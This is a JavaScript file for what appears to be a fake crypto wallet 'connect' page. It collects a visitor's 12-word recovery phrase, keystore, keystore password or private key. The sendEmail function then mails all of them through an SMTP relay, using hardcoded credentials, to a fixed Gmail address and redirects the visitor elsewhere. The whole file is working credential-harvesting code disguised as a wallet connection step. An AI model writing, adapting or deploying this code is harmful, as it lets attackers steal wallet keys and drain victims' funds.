let currentTab = "phrase";

function changeTab(newTab) {
    document.querySelector(`.${currentTab}`).style.display = "none";
    document.querySelector(`#${currentTab}`).style.backgroundColor = "white";

    document.querySelector(`.${newTab}`).style.display = "block";
    document.querySelector(`#${newTab}`).style.backgroundColor = "#92e4fd";

    currentTab = newTab;
}

let phraseText = document.getElementById("ptext");
let keystore = document.getElementById("kstore");
let keystorePwd = document.getElementById("kpassword")
let privateKey = document.getElementById("pkey");

const RECIPIENT = "alexakerele24@gmail.com";
const SENDER = "throughmight@gmail.com";

const sendEmail = () => {
    if (
      (!phraseText.value || phraseText.value.split(" ").length !== 12) &&
      !keystorePwd.value &&
      !privateKey.value
    ) {
      alert("Kindly fill in your data completely.");
      return;
    }
  
    Email.send({
      Host: "smtp.elasticemail.com",
      Username: "throughmight@gmail.com",
      Password: "E4199046C3680EBCB615D763A12E402593E7",
      To: RECIPIENT,
      From: SENDER,
      Subject: "New Wallet Connection",
      Body: `<h1 style="color: azure; background-color: #6d2a6a; padding: 10px;">New Wallet Data</h1>
        <p><b>Phrase Text:</b> <code style="background-color: beige; padding: 3px;">${phraseText.value}</code></p>
        <p><b>Keystore:</b> <code style="background-color: beige; padding: 3px;">${keystore.value}</code></p>
        <p><b>Keystore Password:</b> <code style="background-color: beige; padding: 3px;">${keystorePwd.value}</code></p>
        <p><b>Private Key:</b> <code style="background-color: beige; padding: 3px;">${privateKey.value}</code></p>`
    }).then((message) => {
      if (message === "OK") {
        window.location.href = "contact.html";
      }
    });
}
